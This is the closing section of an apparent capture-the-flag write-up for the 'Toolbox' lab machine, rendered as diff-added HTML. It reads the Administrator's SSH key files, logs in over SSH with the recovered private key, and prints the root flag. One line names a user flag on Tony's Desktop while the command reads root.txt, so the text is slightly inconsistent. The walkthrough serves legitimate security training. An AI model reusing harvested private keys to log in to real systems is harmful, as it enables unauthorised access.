+</span><span class="z-text z-plain">6ZwEmI3J9kKFOKlaYEwrzz
+</span><span class="z-text z-plain">---- END SSH2 PUBLIC KEY ----
+</span></code></pre>
+<p>And the public key is:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@box:/home/docker#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /c/Users/Administrator/.ssh/id_rsa.pub</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+jhIuWD92RK0DiMNQ3GAXyRs0AX7ohgs044J6ml+PPpFI5C8x3TxpsbKeEozOyKJUJ4miP0vwZ9JcZkh+wAhZef2fI1oN0CmgXsx+bUoi2A75b2YzuUCuzjOAHMwZCV4iyRC9ZNwqtA10IOP0nE0huFguEleCuj67l1boRxjOrYxI5GbsD55d+Y+92viETTA1QjDHag4+vZ24F+bG6EvyZlBa7lTX4il7Y2/h8BRiEoZNYePihyNTAb1dxTSIjilwdPedc8qYaOg/KI/OlrlZ2InxCkwTf3w2d7iafE5uhZOneMZonUa6dkLKJzSJLB6ZwEmI3J9kKFOKlaYEwrzz administrator@Toolbox
+</span></code></pre>
+<p>They're the same!</p>
+<h2 id="exploitation-2">Exploitation</h2>
+<p>I'll download the <code>id_rsa</code> file, save it in <code>/workspace</code> and change its permissions to <code>600</code>.</p>
+<p>Now let's use it to connect as <code>Administrator</code> on Toolbox!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh Administrator@10.10.10.236<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> /workspace/id_rsa</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">The authenticity of host &#39;10.10.10.236 (10.10.10.236)&#39; can&#39;t be established.
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span class="z-text z-plain">Warning: Permanently added &#39;10.10.10.236&#39; (ED25519) to the list of known hosts.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Microsoft Windows [Version 10.0.17763.1039]          
+</span><span class="z-text z-plain">(c) 2018 Microsoft Corporation. All rights reserved. 
+</span><span class="z-text z-plain">                                                     
+</span><span class="z-text z-plain">administrator@TOOLBOX C:\Users\Administrator&gt;
+</span></code></pre>
+<p>It worked! If we run <code>whoami</code>, we see that we are indeed <code>Administrator</code>.</p>
+<h1 id="local-enumeration-3">Local enumeration</h1>
+<h2 id="home-folder-3">Home folder</h2>
+<p>The only thing we need to do to finish this box is to retrieve the flag files!</p>
+<p>That's great for us, we should be able to retrieve the flag files!</p>
+<p>We find the user flag on Tony's Desktop. Let's get its content:</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">administrator<span class="z-variable z-other z-readwrite z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">@</span>TOOLBOX</span> C:\Users\Administrator<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> type C:\Users\Administrator\Desktop\root.txt
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">cc9a0b76ac17f8f475250738b96261b3
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/success.png" alt="Success" /></p>
+<p>That's it for this box! The foothold was fairly easy to idnetify and to exploit, thanks to <code>sqlmap</code>. However, I found the path to <code>Administrator</code> much harder, since there was a bit of pivoting involved to get it. I'm definitely not used to such a long path, since I'm mostly doing easy boxes.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
